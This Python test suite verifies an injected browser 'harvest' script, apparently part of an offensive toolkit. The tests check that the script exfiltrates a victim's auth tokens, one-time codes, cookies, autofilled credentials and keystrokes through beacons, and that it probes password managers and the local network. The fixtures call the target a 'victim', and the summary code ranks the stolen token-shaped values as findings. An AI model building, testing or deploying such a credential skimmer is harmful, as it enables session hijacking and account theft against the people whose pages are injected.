"""Real-browser verification of the harvest modules.

The collector is injected into a real Chrome page served by Playwright's request
interception (no sockets needed), storage is pre-populated, the form is
pre-filled like a browser would, and every beacon is captured and parsed. Then
the same merge/summary path the server uses is asserted to surface the findings.

Run:  ./.venv/bin/python -m pytest tests/test_intel_harvest.py -v
"""
import json

import pytest

from core import (
    asset_path,  # noqa: E402
    intel,
)

# tier marker: the Makefile and pyproject document `pytest -m live` (run_all.py ignores markers and runs every file)
pytestmark = pytest.mark.live


pytestmark = pytest.mark.skipif(__import__("os").environ.get("BH_BROWSER_TESTS", "1") != "1",
                                reason="browser tests disabled")


def _chrome():
    try:
        from playwright.sync_api import sync_playwright
        return sync_playwright
    except Exception:
        return None


sync_playwright = _chrome()
if sync_playwright is None:
    pytest.skip("playwright not installed", allow_module_level=True)


PAGE = """<!doctype html><html><head><title>App</title></head><body>
<h1>Sign in</h1>
<form method="post" action="/session">
  <input id="email" name="email" type="email" value="victim@acme.test">
  <input id="password" name="password" type="password" value="S3cret!">
  <input id="hidden_tok" name="authenticity_token" type="hidden" value="zzz">
</form>
</body></html>"""


class Beacons:
    """Collects the collector's beacons instead of letting them hit the network."""

    def __init__(self):
        self.payloads = []

    def handler(self, route, request):
        if request.method == "POST":
            # sendBeacon sends a Blob: Playwright exposes its bytes through
            # post_data_buffer, while post_data is None for a Blob body
            raw = request.post_data
            if raw is None:
                try:
                    buf = request.post_data_buffer
                    raw = buf.decode("utf-8", "replace") if buf else ""
                except Exception:
                    raw = ""
            try:
                self.payloads.append(json.loads(raw or "{}"))
            except Exception:
                self.payloads.append({"_unparsed": (raw or "")[:200]})
            route.fulfill(status=200, content_type="application/json", body='{"ok":true}')
            return
        route.fulfill(status=200, content_type="text/html", body=PAGE)

    def merged(self):
        """The merged MODULE MAP (merge_waves returns it directly, with
        _errors/_waves keys alongside the modules)."""
        out = {}
        for p in self.payloads:
            out = intel.merge_waves(out, p)
        return out

    def waves(self):
        return [p.get("wave") for p in self.payloads]


@pytest.fixture()
def page_and_beacons():
    with sync_playwright() as p:
        browser = None
        try:
            browser = __import__("core.session", fromlist=["session"])._launch(p, headless=True)
        except Exception as e:
            pytest.skip(f"no usable Chrome: {e}")
        ctx = browser.new_context()
        b = Beacons()
        ctx.route("**/*", b.handler)
        page = ctx.new_page()
        page.goto("http://intel.test/page", wait_until="domcontentloaded")
        # storage a real app would have: tokens, user ids, preferences
        page.evaluate("""() => {
            localStorage.setItem('authToken',
                'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0ifQ.abcdefghijklmnop');
            localStorage.setItem('user', '{"id":42,"email":"victim@acme.test"}');
            localStorage.setItem('theme', 'dark');
            sessionStorage.setItem('otp_pending', '482913');
            document.cookie = 'csrftoken=abc123; path=/';
        }""")
        js_file = asset_path("intel.js")
        js = intel.render_js(js_file, "harvest-test", perms=True)
        page.add_script_tag(content=js)
        # let the deep waves fire (deep 2.5s, deep2 6s, inputBehaviour 8s)
        page.wait_for_timeout(11000)
        page.evaluate("""() => {
            const e = document.getElementById('email');
            e.dispatchEvent(new KeyboardEvent('keydown', {key: 'a', bubbles: true}));
            e.dispatchEvent(new KeyboardEvent('keydown', {key: 'Backspace', bubbles: true}));
        }""")
        page.wait_for_timeout(1500)
        yield page, b
        browser.close()


class TestCollectorRuns:
    def test_beacons_arrive_with_the_expected_waves(self, page_and_beacons):
        page, b = page_and_beacons
        waves = b.waves()
        assert "open" in waves and "deep" in waves
        assert len(b.payloads) >= 3

    def test_no_module_errored(self, page_and_beacons):
        page, b = page_and_beacons
        merged = b.merged()
        errors = merged.get("_errors") or {}
        # the harvest modules must not be in the error map
        for name in ("storage", "autofill", "pwmgr", "inputBehaviour"):
            assert name not in errors, f"{name} failed: {errors.get(name)}"


class TestHarvestData:
    def test_storage_is_harvested(self, page_and_beacons):
        page, b = page_and_beacons
        st = b.merged().get("storage") or {}
        assert st.get("localStorage", {}).get("authToken", "").startswith("eyJ")
        assert st["localStorage"].get("user", "").find("victim@acme.test") != -1
        assert st.get("sessionStorage", {}).get("otp_pending") == "482913"
        assert "csrftoken" in (st.get("cookieNames") or [])

    def test_autofill_values_are_harvested(self, page_and_beacons):
        page, b = page_and_beacons
        af = b.merged().get("autofill") or {}
        assert af.get("filled", 0) >= 2
        names = {f.get("name") for f in af.get("fields") or []}
        assert "email" in names
        email = [f for f in af["fields"] if f["name"] == "email"][0]
        assert email["value"] == "victim@acme.test"
        # a hidden anti-CSRF field is never reported as a credential
        assert "authenticity_token" not in names

    def test_password_manager_probe_returns_a_shape(self, page_and_beacons):
        page, b = page_and_beacons
        pm = b.merged().get("pwmgr")
        assert isinstance(pm, dict)
        assert "detected" in pm and "chromeRuntime" in pm

    def test_input_behaviour_records_keystrokes(self, page_and_beacons):
        page, b = page_and_beacons
        ib = b.merged().get("inputBehaviour") or {}
        assert ib.get("keystrokes", 0) >= 2
        assert ib.get("backspaces", 0) >= 1
        assert "email" in (ib.get("fieldsTyped") or [])

    def test_lan_probe_runs_only_with_perms(self, page_and_beacons):
        page, b = page_and_beacons
        mods = b.merged()
        # perms=True in this fixture, so the module must have produced something
        assert "lanProbe" in mods, "lanProbe missing even though perms were granted"


class TestSummarySurfacesIt:
    def test_merge_and_summary_expose_the_tokens(self, page_and_beacons):
        page, b = page_and_beacons
        mods = b.merged()
        summary = intel.summarize(mods, ua="Mozilla/5.0 Chrome/124.0")
        h = summary["harvest"]
        assert h["storage"]["localStorage"]["count"] >= 3
        assert any(v["key"] == "authToken" and v["token_shaped"]
                   for v in h["interesting_values"])
        assert h["autofill"]["filled"] >= 2
        assert summary["harvest_findings"], "findings must not be empty"

    def test_dump_text_includes_the_harvest_block(self, page_and_beacons):
        page, b = page_and_beacons
        rec = intel.summarize(b.merged(), ua="Mozilla/5.0 Chrome/124.0")
        text = intel.dump_text(rec, width=78)
        assert "HARVEST" in text


class TestTokenDetection:
    def test_jwt_is_flagged(self):
        assert intel._looks_like_token("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.sig")

    def test_high_entropy_secret_is_flagged(self):
        assert intel._looks_like_token("aB3xK9mQ2wL8pR4tY6uI0oP1sD7fG5hJ")

    def test_long_but_low_entropy_values_are_not(self):
        """Length alone flagged word phrases and digit runs as secrets."""
        for v in ("a" * 40, "ThisIsAVeryLongPreferenceValue123",
                  "SUPERSECRETSESSIONTOKENVALUE123456", "123456789012345678901234"):
            assert not intel._looks_like_token(v), v

    def test_short_or_boring_values_are_not(self):
        for v in ("dark", "", "on", "1234", "en-US"):
            assert not intel._looks_like_token(v)

    def test_harvest_summary_handles_missing_modules(self):
        h = intel.harvest_summary({})
        assert h["storage"] == {} and h["autofill"] == {}
        assert intel.harvest_findings({}) == []
